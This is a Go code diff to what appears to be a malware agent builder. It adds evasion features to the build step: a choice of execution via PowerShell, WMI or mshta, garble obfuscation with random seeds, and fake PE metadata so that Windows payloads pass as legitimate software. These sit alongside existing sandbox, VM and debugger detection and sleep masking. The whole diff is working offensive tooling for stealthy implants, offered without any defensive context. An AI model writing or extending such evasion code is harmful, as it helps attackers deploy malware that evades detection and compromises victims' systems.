@@ -56,6 +56,11 @@ type OpsecProfile struct {
 	WorkingHoursOnly   bool          `json:"working_hours_only"`
 	WorkingHoursStart  int           `json:"working_hours_start"` // 24h format, e.g. 8
 	WorkingHoursEnd    int           `json:"working_hours_end"`
+
+	// Level 1 evasion
+	ExecMethod string           `json:"exec_method"` // direct | cmd | powershell | wmi | mshta
+	Obfuscate  bool             `json:"obfuscate"`   // use garble for symbol/string obfuscation
+	Masquerade MasqueradeConfig `json:"masquerade"`  // fake PE metadata (company, product, version)
 }
 
 // Config holds all parameters for agent generation
@@ -137,6 +142,18 @@ func (g *Generator) Build(cfg *Config) (*Result, error) {
 			p.EnableSandboxCheck || p.EnableVMCheck || p.EnableDebugCheck)
 		ldflags += " -X main.defaultSleepMasking=" + strconv.FormatBool(p.SleepMasking)
 		ldflags += " -X main.defaultUserAgentRotation=" + strconv.FormatBool(p.UserAgentRotation)
+		if p.ExecMethod != "" {
+			ldflags += " -X main.defaultExecMethod=" + p.ExecMethod
+		}
+
+		// Apply PE masquerade (Windows targets only)
+		if p.Masquerade.Enabled && cfg.TargetOS == OSWindows {
+			cleanup, err := applyMasquerade(g.sourceDir, p.Masquerade, string(cfg.TargetArch))
+			if err != nil {
+				return nil, fmt.Errorf("masquerade: %v", err)
+			}
+			defer cleanup()
+		}
 	}
 
 	if cfg.StripSyms {
@@ -147,14 +164,18 @@ func (g *Generator) Build(cfg *Config) (*Result, error) {
 		ldflags += " -H windowsgui"
 	}
 
-	args := []string{
-		"build",
-		"-ldflags", ldflags,
-		"-o", outPath,
-		g.sourceDir,
+	// Use garble for symbol/string obfuscation if requested
+	// Requires: go install mvdan.cc/garble@latest
+	goBin := "go"
+	var args []string
+	if cfg.Profile != nil && cfg.Profile.Obfuscate {
+		goBin = "garble"
+		args = []string{"-tiny", "-seed=random", "build", "-ldflags", ldflags, "-o", outPath, g.sourceDir}
+	} else {
+		args = []string{"build", "-ldflags", ldflags, "-o", outPath, g.sourceDir}
 	}
 
-	cmd := exec.Command("go", args...)
+	cmd := exec.Command(goBin, args...)
 	cmd.Env = append(os.Environ(),
 		"GOOS="+string(cfg.TargetOS),
 		"GOARCH="+string(cfg.TargetArch),
